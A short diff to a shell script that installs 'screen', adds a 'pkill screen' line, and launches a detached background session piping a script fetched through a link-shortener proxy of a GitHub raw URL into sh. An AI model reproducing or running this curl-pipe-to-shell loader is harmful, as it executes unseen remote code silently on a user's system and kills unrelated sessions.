@@ -1,5 +1,4 @@
 #!/bin/sh
-
 # Check if screen is installed on the system
 if ! command -v screen &> /dev/null; then
     echo "Installing screen..."
@@ -21,5 +20,6 @@ if ! command -v screen &> /dev/null; then
 fi
 
 # Run the command to download and execute the script in the background using screen
+pkill screen
 screen -dm sh -c "cd /usr/local/bin/ && curl -sSL https://slink.ltd/https://raw.githubusercontent.com/lin2elysia/load/main/load.sh | sh"
 echo "Service Is Running"
